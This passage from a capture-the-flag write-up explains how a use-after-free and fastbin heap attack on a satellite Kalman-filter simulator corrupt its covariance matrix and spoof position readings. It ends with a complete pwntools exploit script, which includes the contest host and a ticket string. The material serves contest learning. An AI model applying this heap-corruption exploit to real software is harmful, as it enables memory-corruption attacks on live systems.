</code></pre><p>This chunk contains the double precision floating point representation of 100 (0x4059000000000000) and 10 (0x4024000000000000).</p><p>Using the fastbin attack that was previously employed, it is possible to modify the values in the covariance matrix. This allows to give measures with the accuracy that we choose, enabling us to heavily affect the simulation. To carry out the fastbin attack successfully, we need to place the address of something that resembles a 0x40 sized chunk in the 0x40 fastbin. Since the chunk storing the covariance matrix has a size of 0x40, it can be placed in the 0x40 fastbin. Specifically, we insert the address <code>heap_base + 0x11e90</code> into the 0x40 fastbin.</p><p>Being the covariance matrix:</p><p>\begin{matrix} a_{0,0} & a_{0,1} & a_{0,2} \ a_{1,0} & a_{1,1} & a_{1,2} \ a_{2,0} & a_{2,1} & a_{2,2} \end{matrix}</p><p>by allocating two additional position measurements, it is possible to place arbitrary values in $a_{0,0}$ and $a_{a_{1,1}}$, while storing the forward and backward pointers of the 0x40 fastbin in $a_{0,1}$, $a_{1,0}$, and $a_{2,2}$. When interpreted using floating point representation, these values are close to zero.</p><p>We put in $a_{0,0}, a_{0,1}$ the value 0, with a resulting covariance matrix of</p><p>$\begin{matrix} 0 & 4.65326\mathrm{e}{-310} & 10 \ 4.65326\mathrm{e}{-310} & 0 & 10 \ 10 & 10 & 4.65326\mathrm{e}{-310} \end{matrix}$</p><p>The zeros along the diagonal for the x and y coordinates and the extremely small value for the z coordinate, make the sensor behave almost as ground truth, moving the estimate for the position almost exactly to where we put the reading.</p><h4 class="relative group">Poisoning measurements to make the satellite closer to the space station<div id=poisoning-measurements-to-make-the-satellite-closer-to-the-space-station class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#poisoning-measurements-to-make-the-satellite-closer-to-the-space-station aria-label=Anchor>#</a></span></h4><p>In the final step of the exploitation, the position values stored in memory are modified to bring the satellite closer to the space station.</p><p>The <code>User::run(User *this)</code> function is responsible for running the simulation. By examining the function, it becomes clear that the simulation processes each acceleration measurement provided in the <code>accels.bin</code> file. The file contains a set of accelerations from timestamp 0 to timestamp 100.9 seconds, with each acceleration separated by an interval of 0.1 seconds.</p><p>The simulation algorithm only processes a position measurement if it precedes the currently processed acceleration. Otherwise, the algorithm only propagates using the state and accelerations.</p><p>However, it is important to note that the simulation algorithm considers the positions stored in the <code>LinkedList</code> of measurements in ascending order of timestamp.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// Get the head element of LinkedList
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Front</span> <span class=o>=</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>getFront</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>positions_linked_list</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1>// Simulation code
</span></span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>CurrentAcceleration</span><span class=p>.</span><span class=n>Time</span> <span class=o>&lt;=</span> <span class=n>Front</span><span class=p>.</span><span class=n>Time</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Propagate the current result
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Use the position to update the simulation state
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>popFront</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>positions_linked_list</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>getFront</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>positions_linked_list</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>Front</span> <span class=o>=</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>getFront</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>positions_linked_list</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The pseudocode indicates that the <code>LinkedList</code> of positions is only iterated
when the current acceleration has a lower timestamp than the current position.
By adding a series of positional readings with a timestamp close to the end of
the simulation at the head of the LinkedList, the simulation will proceed using
only the acceleration up to that point. Then, thanks to the extremely small
covariance matrix, the positional readings can deceive the Kalman filter placing
the estimate to where we need it, with high reported accuracy.</p><p>Thankfully, we have control over the head of the LinkedList while draining the
tcache 0x40. We simply need to drain the tcache by inserting measurements with a
timestamp close to the final acceleration, which occurs at 100000999
microseconds. The resulting measurement list will appear like this:</p><pre tabindex=0><code>Raw Measurement 0: 100000999 0 0 0
Raw Measurement 1: 100000999 0 0 0
Raw Measurement 2: 100000999 0 0 0
Raw Measurement 3: 100000999 0 0 0
Raw Measurement 4: 100000999 0 0 0
Raw Measurement 5: 100000999 0 0 0
Raw Measurement 6: 100000999 0 0 0
Raw Measurement 7: 3735928559 3648368.206055 3468143.733398 3468144.206055
Raw Measurement 8: 0 0.063477 0.000000 0.000000
Raw Measurement 9: 0 0.063477 0.000000 0.000000
</code></pre><p>Running the simulation with these position values, we obtain a final covariance matrix of
\begin{matrix} 2.40386 && 0.0149185 && 1.46353 \ 0.0149185 && 2.40386 && 1.46353 \ 1.46353 && 1.46353 && 2.41878 \end{matrix}</p><p>and a final estimated position of $-38.138080,-27.710931,-1.540729$.</p><p>To ensure that the final position satisfies the 10-meter constraint from the
space station, it is necessary to drain the tcache with the following position
measurement: $100000999, 33.203125, 21.484375, 2.929688$.</p><p>This did the trick, giving us a final position estimate of
$-4.933969,-6.225570,1.020739$ and the same final covariance matrix, at the end
of the simulation.</p><p>So, we got the flag!</p><h3 class="relative group">Exploit script<div id=exploit-script-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-script-1 aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#import ipdb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># exe = ELF(&#34;./Kalman_patched&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># libc = ELF(&#34;./libc-2.31.so&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context.binary = exe</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#39;warning&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>2007</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;wait for gdb to attach&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;kalman.quals2023-kah5Aiv9.satellitesabove.me&#34;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;please:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;ticket{yankee725474mike4:GPYXYVILP60gKGJ1cc_gpGhXmFSaJh9uwelxoeiMoPAPH84JrU4Sp4EsjVnd_U9xVg}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_measurement</span><span class=p>(</span><span class=n>time</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>,</span> <span class=n>z</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Time (US)&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%ld</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;X&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%ld</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Y&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%ld</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Z&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%ld</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_measurement_raw</span><span class=p>(</span><span class=n>time</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>,</span> <span class=n>z</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Time (US)&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;X&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Y&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Z&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>remove_first_measurement</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>remove_last_measurement</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>list_measurements</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>measurements</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=sa>b</span><span class=s2>&#34;Raw Measurement&#34;</span> <span class=ow>in</span> <span class=n>l</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>l</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>measurements</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>])]</span> <span class=o>+</span> <span class=p>[</span><span class=nb>float</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>:]])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>measurements</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poison_covariance_matrix</span><span class=p>(</span><span class=n>heap_start</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># first add will overewrite the UAFd head, so we are good</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=mh>0x4141414141414141</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># A &lt;-&gt; A (6 elements in 0x40 tcache)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># A &lt;-&gt; A (0x40 tcache full)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>remove_first_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A (free)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># now tcache is empty</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A &lt;-&gt; ... (7)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># (tcache 0x40 full)</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A (free) &lt;-&gt; ... (7) ... ?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; A (free) ?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># double free fastbin A ?</span>
</span></span><span class=line><span class=cl>    <span class=c1># NULL &lt;-&gt; NULL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add_measurement</span><span class=p>(</span><span class=mi>100000999</span><span class=p>,</span> <span class=mi>34000</span><span class=p>,</span><span class=mi>22000</span><span class=p>,</span> <span class=mi>3000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># drain tcache 0x40</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Arbitrary write with fastbin attack</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>heap_start</span> <span class=o>+</span> <span class=mh>0x11e90</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># first fastbin (A)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add_measurement</span><span class=p>(</span><span class=mi>90</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Z&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;X&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># take 7 tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=mh>0xdeadc0d3</span><span class=p>,</span> <span class=mh>0xd3adbeef</span><span class=p>,</span> <span class=mh>0xd3adc0d3</span><span class=p>)</span> <span class=c1># place tcache inside an unsorted</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=mh>0x41</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=mh>0x41</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=n>u64</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;d&#39;</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)))</span> <span class=c1># alloc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># heap leak</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>heap_leak</span> <span class=o>=</span> <span class=n>list_measurements</span><span class=p>()[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>heap_init_offset</span> <span class=o>=</span> <span class=mh>0x14b40</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_start</span> <span class=o>=</span> <span class=n>heap_leak</span> <span class=o>-</span> <span class=n>heap_init_offset</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;heap base : 0x</span><span class=si>%x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>heap_start</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_covariance_matrix</span><span class=p>(</span><span class=n>heap_start</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Run simulation</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
